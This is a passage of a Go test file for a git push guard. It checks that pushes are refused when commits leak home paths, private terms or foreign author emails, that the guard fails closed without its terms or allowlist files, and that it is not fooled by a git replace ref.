	home := "/" + "home/alice/notes/"
	refused := func(name, sha, want string, banned ...string) {
		t.Helper()
		r.verify(sha)
		out, errs, code := r.push(sha)
		if code != 3 || out != "" || !strings.Contains(errs, "refused: public text in the pushed range") ||
			!strings.Contains(errs, want) || r.pushed() != "" {
			t.Errorf("%s: exit %d out %q err %q (want %q)", name, code, out, errs, want)
		}
		for _, b := range banned {
			if strings.Contains(errs, b) {
				t.Errorf("%s: the matched text %q is in the refusal %q", name, b, errs)
			}
		}
	}
	r.head("")
	sha := r.mergeHead("Merge side, see " + home + "x.txt")
	refused("merge home path", sha, "home-path in commit "+sha[:8]+" message", "alice")

	gitIn(t, r.wt, "reset", "-q", "--hard", base)
	r.write("h.txt", "contact "+relayTerm+" here\n")
	sha = r.commit("work")
	refused("term in added line", sha, "in an added line", relayTerm)

	gitIn(t, r.wt, "reset", "-q", "--hard", base)
	r.write("h.txt", "x\n")
	sha = r.commit("talked to " + relayTerm)
	refused("term in message", sha, "in commit "+sha[:8]+" message", relayTerm)
	if n := r.e.str("SELECT count(*) FROM events WHERE action='relay-push'"); n != "0" {
		t.Errorf("refused pushes wrote %s relay-push rows", n)
	}

	// clean history (with a merge commit) passes
	gitIn(t, r.wt, "reset", "-q", "--hard", base)
	gitIn(t, r.wt, "branch", "-q", "-D", "side")
	r.head("")
	sha = r.mergeHead("Merge side")
	r.verify(sha)
	if out, errs, code := r.push(sha); code != 0 || r.pushed() == "" {
		t.Fatalf("clean merge: exit %d out %q err %q", code, out, errs)
	}

	// fail closed: no terms, no allowlist
	r.e.sql("UPDATE config SET value='' WHERE key='scrub_terms_file'")
	if _, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, "the public-text check could not decide") || r.pushed() != "" {
		t.Errorf("no terms: exit %d err %q", code, errs)
	}
	r.e.sql("UPDATE config SET value=? WHERE key='scrub_terms_file'", filepath.Join(r.e.home, "missing-terms.txt"))
	if _, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, "could not decide") || r.pushed() != "" {
		t.Errorf("missing terms file: exit %d err %q", code, errs)
	}
}

// TestRelayPushPublicTextAllowlist: without <home>/ci/scrub_allowlist.txt the check cannot decide and refuses.
func TestRelayPushPublicTextAllowlist(t *testing.T) {
	r := newRelayRepo(t)
	sha := r.head("")
	r.verify(sha)
	os.Remove(filepath.Join(r.e.home, "ci", "scrub_allowlist.txt"))
	if _, errs, code := r.push(sha); code != 3 || !strings.Contains(errs, "could not decide") || !strings.Contains(errs, "scrub_allowlist.txt") || r.pushed() != "" {
		t.Errorf("no allowlist: exit %d err %q", code, errs)
	}
}

// TestRelayPushReplaceRefIgnored: a refs/replace/<head> that swaps a foreign-email head for a clean one must not fool
// the checks: they read the real commit (GIT_NO_REPLACE_OBJECTS), so the push is refused.
func TestRelayPushReplaceRefIgnored(t *testing.T) {
	r := newRelayRepo(t)
	base := gitIn(t, r.wt, "rev-parse", "HEAD")
	r.write("g.txt", "evil\n")
	bad := r.commit("foreign", "GIT_AUTHOR_EMAIL=someone@example.com")
	gitIn(t, r.wt, "reset", "-q", "--hard", base)
	r.write("g.txt", "evil\n")
	good := r.commit("clean")
	gitIn(t, r.wt, "reset", "-q", "--hard", bad)
	gitIn(t, r.wt, "replace", bad, good)
	r.verify(bad)
	if _, errs, code := r.push(bad); code != 3 || !strings.Contains(errs, "author email 'someone@example.com' is not the factory noreply") || r.pushed() != "" {
		t.Errorf("replace ref: exit %d err %q", code, errs)
	}
}
